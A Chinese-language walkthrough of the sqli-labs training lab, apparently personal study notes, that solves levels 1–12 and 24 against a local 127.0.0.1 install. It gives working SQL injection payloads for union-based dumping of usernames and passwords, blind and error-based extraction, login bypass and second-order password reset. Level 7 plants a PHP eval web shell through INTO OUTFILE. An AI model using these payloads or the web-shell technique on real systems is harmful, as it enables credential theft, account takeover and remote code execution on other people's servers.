# 第一部分/page-1 Basic Challenges

## Less-01

http://127.0.0.1/sqli-labs-master/Less-1/?id=1'

![image-20220330095858276](./image/image-20220330095858276.png)



http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=1--+

![image-20220330095820292](./image/image-20220330095820292.png)

http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=2 --+

![image-20220330095957034](./image/image-20220330095957034.png)

### union联合查询

order by判断字段数

http://127.0.0.1/sqli-labs-master/Less-1/?id=1' order by 3 --+

![image-20220330100354088](./image/image-20220330100354088.png)

![image-20220330100411779](./image/image-20220330100411779.png)

判断出字段数是3

使用union联合查询，发现2和3处回显

![image-20220330101133198](./image/image-20220330101133198.png)

查询所有库

http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata--+

![image-20220330101339595](./image/image-20220330101339595.png)

查询security库下所有表

http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+

![image-20220330101614521](./image/image-20220330101614521.png)

爆 users 表的所有列（字段）

http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+

![image-20220330101753352](./image/image-20220330101753352.png)

爆 username，password列（字段）的值

http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=2 union select 1,username,password from users where id=1--+

![image-20220330101930225](./image/image-20220330101930225.png)

可以爆所有值

http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=2 union select 1,group_concat(username),group_concat(password) from users --+

![image-20220331102524073](./image/image-20220331102524073.png)

## Less-02

http://127.0.0.1/sqli-labs/Less-2/?id=1'

![image-20220331104151648](./image/image-20220331104151648.png)

这题是数值型，再次通过以下判断

http://127.0.0.1/sqli-labs/Less-2/?id=2-1

![image-20220331104414950](./image/image-20220331104414950.png)

其它同Less-01不再重复

## Less-03

继续使用 ?id=1' 

发现报错比着之前多了右括号 )

![image-20220331105234051](./image/image-20220331105234051.png)

看下源码

![image-20220331105335182](./image/image-20220331105335182.png)

构造闭合

http://127.0.0.1/sqli-labs/Less-3/?id=1') and 1=1 %23

![image-20220331105609709](./image/image-20220331105609709.png)

其它与前面一致



## Less-04

加`单引号'`  和 数值型都没用了，这次用双引号闭合  `"`

有点效果

![image-20220331111042666](./image/image-20220331111042666.png)

推测出需要双引号和右括号`")`闭合

http://127.0.0.1/sqli-labs/Less-4/?id=1") and 1=2 %23

![image-20220331111515824](./image/image-20220331111515824.png)

http://127.0.0.1/sqli-labs/Less-4/?id=1") and 1=1 %23

![image-20220331111539021](./image/image-20220331111539021.png)

源码部分

![image-20220331111841695](./image/image-20220331111841695.png)

其它与Less-01相同，同样可以用union联合查询注入



## Less-05

这一关卡考察的盲注，当输入正确id时候，只能弹出**You are in...........**

![image-20220331235944259](./image/image-20220331235944259.png)

所以再用前面几关的方法就不行了

### 布尔盲注

#### 1）利用 left(database(),1)函数盲注

http://127.0.0.1/sqli-labs/Less-5/?id=1' and left(version(),1)=5%23
查看一下 version()， 数据库的版本号为 5.6.17， 这里的语句的意思是看版本号的第一位是不是 5， 明显的返回的结果是正确的

![image-20220401000504110](./image/image-20220401000504110.png)

当版本号不正确的时候， 则不能正确显示 You are in........

![image-20220401000656370](./image/image-20220401000656370.png)

接下来看一下数据库的长度
http://127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())=8%23
长度为 8 时， 返回正确结果， 说明长度为 8  

![image-20220401000959868](./image/image-20220401000959868.png)

猜测数据库第一位
http://127.0.0.1/sqli-labs/Less-5/?id=1'and left(database(),1)>'a'%23

![image-20220401001319431](./image/image-20220401001319431.png)

Database()为 security， 所以我们看他的第一位是否 > a,很明显的是 s > a,因此返回正确。 当
我们不知情的情况下， 可以用二分法来提高注入的效率。 

![image-20220401001551720](./image/image-20220401001551720.png) 

这时候其就是就可以抓包爆破，或者写个脚本去跑就行了，当然可以用sqlmap，这里手动探索一下注入方法。

后面不再挨个试了。。

#### 2）利用 substr() ascii()函数盲注 

```
ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101
```

根据以上得知数据库名为 security， 那我们利用此方式获取 security 数据库下的表。
获取 security 数据库的第一个表的第一个字符  

```
http://127.0.0.1/sqli-labs/Less-5/?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 
0,1),1,1))>80--+
```

![image-20220401100942210](./image/image-20220401100942210.png)

Ps： 此处 table_schema 可以写成 ='security'， 但是我们这里使用的 database()， 是因为此处 database()就是 security。 此处同样的使用二分法进行测试， 直到测试正确为止。
此处应该是 101， 因为第一个表示 email。  



如何获取第一个表的第二位字符呢？
这里我们已经了解了 substr()函数， 这里使用 substr(**,2,1)即可。  

![image-20220401101630205](./image/image-20220401101630205.png)

通过不断尝试，可以得到第二个字符的ascii码是109，对应字母m，一次类推即可

那如何获取第二个表呢？ 思考一下！

这里可以看到我们上述的语句中使用的 limit 0,1. 意思就是从第 0 个开始， 获取第一个。 那要获取第二个是不是就是 limit 1,1   往下看

```
http://127.0.0.1/sqli-labs/Less-5/?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 
1,1),1,1))>113--+
```

![image-20220401102619973](./image/image-20220401102619973.png)

此处 113 返回是正确的，当输入114时候，就报错了。 因为第二个表示 referers 表， 所以第一位就是 r

后面可以逐个爆破就行了，不再重复

利用 regexp 获取（2） 中 users 表中的列  

#### 3）利用 regexp 获取users表中的列 

http://127.0.0.1/sqli-labs/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)--+

![image-20220401111628044](./image/image-20220401111628044.png)

上述语句时选择 users 表中的列名是否有 us**的列  

http://127.0.0.1/sqli-labs/Less-5/?id=1' and 111=(select 111 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)--+

![image-20220401112206881](./image/image-20220401112206881.png)

上图中可以看到 username 存在。 我们可以将 username 换成 password 等其他的项也是正确的  

![image-20220401112229019](./image/image-20220401112229019.png)

另外说下为什么用111=(select 111 from .......)，看下在select语句在mysql控制台下的数据就知道了

![image-20220401150843056](./image/image-20220401150843056.png)

![image-20220401150858709](./image/image-20220401150858709.png)

这里举例说明，如果真实存在users表，而且是列名称是依pass开头的，如果用*表示，则会全部列出，如果其他数字代替，那么结果里会处输出该数字，而且实际几列也会列出几列，所以用`limit 0,1`  列出输入的数字就可以了，所以前面用同样字符构造为真就行了

#### 4）利用 ord()和mid() 函数获取users表内容

http://127.0.0.1/sqli-labs/less-5/?id=1' and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))=68--+  

![image-20220401151602553](./image/image-20220401151602553.png)

获取 users 表中的内容。 获取 username 中的第一行的第一个字符的 ascii， 与 68 进行比较，即为 D。 而我们从表中得知第一行的数据为 Dumb。 所以接下来只需要重复造轮子即可。  

总结： 以上1 - 4，我们通过使用不同的语句， 将通过布尔盲注 SQL 的所有的 payload 进行演示了一次。 想必通过实例更能够对 sql 布尔盲注语句熟悉和理解了。  

### 报错注入

#### 1、通过floor报错

```
http://127.0.0.1/sqli-labs/Less-5/?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+
```

![image-20220401152222552](./image/image-20220401152222552.png)

#### 2、exp()报错

```
http://127.0.0.1/sqli-labs/Less-5/?id=1' union select (exp(~(select * FROM(SELECT USER())a))),2,3--+
```

![image-20220401152623943](./image/image-20220401152623943.png)



#### 3、bigint 溢出报错注入  

http://127.0.0.1/sqli-labs/Less-5/?id=1' union select (!(select * from (select user())x) - ~0),2,3--+

![image-20220401154712711](./image/image-20220401154712711.png)

#### 4、extractvalue函数报错注入

http://127.0.0.1/sqli-labs/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select user()),0x7e))--+

![image-20220401155232829](./image/image-20220401155232829.png)

#### 5、updatexml函数报错注入

http://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+

![image-20220401155703139](./image/image-20220401155703139.png)

#### 6、数据重复性

http://127.0.0.1/sqli-labs/Less-5/?id=1'union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+

![image-20220401163126231](./image/image-20220401163126231.png)

### 时间盲注

#### 1、利用 sleep()函数盲注

http://127.0.0.1/sqli-labs/Less-5/?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+

![image-20220401163400061](./image/image-20220401163400061.png)

## Less-06

http://127.0.0.1/sqli-labs/Less-6/?id=1"

![image-20220401165156079](./image/image-20220401165156079.png)

看源码

![image-20220401165441838](./image/image-20220401165441838.png)

比着less-05加双引号闭合，不再重复

## Less-07

这关提示使用outfile，本关title为Dump into Outfile

查看源码，如下

![image-20220401170144869](./image/image-20220401170144869.png)

构造闭合，注入

![image-20220401170359846](./image/image-20220401170359846.png)

写入一句话

```
http://127.0.0.1/sqli-labs/Less-7/?id=1'))UNION SELECT 1,2,'<?php @eval($_post["cmd" ])?>' into outfile "E:\\Program Files\\wamp\\www\\sqli-labs\\Less-7\\yijuhua.php"--+
```

![image-20220401170822787](./image/image-20220401170822787.png)

可以看到该目录下已吸入一句话木马

![image-20220401170901797](./image/image-20220401170901797.png)

后面那菜刀等工具去连接就可以了

这里注意需要写入权限，需要知道写入路径。



## Less-08

这一关同样是用`单引号'`闭合，同样用上面的盲注

http://127.0.0.1/sqllib/Less-8/?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+

![image-20220401193648996](./image/image-20220401193648996.png)

看下源码，发现把sql报错那一行注释了

![image-20220401193851740](./image/image-20220401193851740.png)

这样就不能再使用报错注入了

![image-20220401194044441](./image/image-20220401194044441.png)

## Less-09

这关是基于时间盲注（单引号）

使用单引号闭合时候还是显示 You are in........

一度以为不存在注入，查看源码，才知道输入正确与否返回内容一样

![image-20220401200403239](./image/image-20220401200403239.png)

使用时间盲注

### **猜测数据库**

http://127.0.0.1/sqli-labs/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+

![image-20220401200614856](./image/image-20220401200614856.png)

说明第一位是 s (ascii码115）

http://127.0.0.1/sqli-labs/Less-9/?id=1' and if(ascii(substr(database(),2,1))=101,1,sleep(5))--+
说明第一位是 e (ascii码101）
...

依次爆破得到数据库名security

### **猜测 security 的数据表**

http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))--+
猜测第一个数据表的第一位是 e,...依次类推， 得到 emails
http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))=114,1,sleep(5))--+
猜测第二个数据表的第一位是 r,...依次类推， 得到 referers
...  

再以此类推， 我们可以得到所有的数据表 emails,referers,uagents,users  

### **猜测 users 表的列**

http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 2,1),1,1))=85,1,sleep(2))--+

![image-20220401203623245](./image/image-20220401203623245.png)

依次猜测 users 表的第一个列的第一个字符是 U（ascii码85）
以此类推， 我们得到列名是 id， username， password  等，（ps：这里我users表里还有其它列）

### 猜测 username 的值

http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+
猜测 username 的第一行的第一位
以此类推， 我们得到数据库 username， password 的所有内容 。

## Less-10

从标题可以看出这关是基于时间盲注（单引号）

![image-20220401204140887](./image/image-20220401204140887.png)

与Less-09相比，把单引号换成双引号即可，不再重复

## Less-11

这一关卡可以用万能密码

![image-20220401214213686](./image/image-20220401214213686.png)



当我们提交 username 和 password 后， 后台形成的 sql 语句为

```
$sql="SELECT username, password FROM users WHERE username='admin'or'1'='1# and
1='$passwd' LIMIT 0,1";  
```

在#以后的内容就被注释掉，前面的内容因为 or 1=1 恒成立，所以语句就成立，我们此时以admin 的用户登录。 

后面的注入方法和GET型一样，不再重复。



## Less-12

在username输入框内输入 `admin"` ，发现报错语句里面出现了右括号

![image-20220401215211557](./image/image-20220401215211557.png)

构造语句闭合sql语句，如下

uname=admin") or 1=1 #&passwd=123

![image-20220401215327971](./image/image-20220401215327971.png)

其它同Less-11关卡，不再重复



## Less-13













## Less-24

本题考察二次注入

本关可能会有朋友和我遇到一样的问题， 登录成功以后没有修改密码的相关操作。 此时造成问题的主要原因是 logged-in.php 文件不正确。 可重新下载解压， 解压过程中要覆盖。  

二次注入也称存储型的注入， 就是将可能导致sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以出发 sql 注入。

```
二次排序注入思路：
1. 黑客通过构造数据的形式， 在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理， 提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。
2. 服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。
3. 黑客向服务端发送第二个与第一次不相同的请求数据信息。
4. 服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。
5. 服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。
```

假如知道了admin账号，而不知道该账号密码，这时候注册一个admin'#账号，修改admin'#账号密码时候，达到修改admin账号密码目的

![image-20220412161052055](./image/image-20220412161052055.png)

数据库中可以看到已注册admin'#账号，密码为123456

![image-20220412160152457](./image/image-20220412160152457.png)

重置admin'#密码为admin123

![image-20220412160002334](./image/image-20220412160002334.png)

发现admin'#账号密码未改变，此时admin账号密码已改变

![image-20220412160046203](./image/image-20220412160046203.png)

Sql 语句变为 `UPDATE users SET passwd="New_Pass" WHERE username ='admin'# ' AND password='` ，也 就 是 执 行 了 `UPDATE users SET passwd="New_Pass" WHERE username ='admin'`

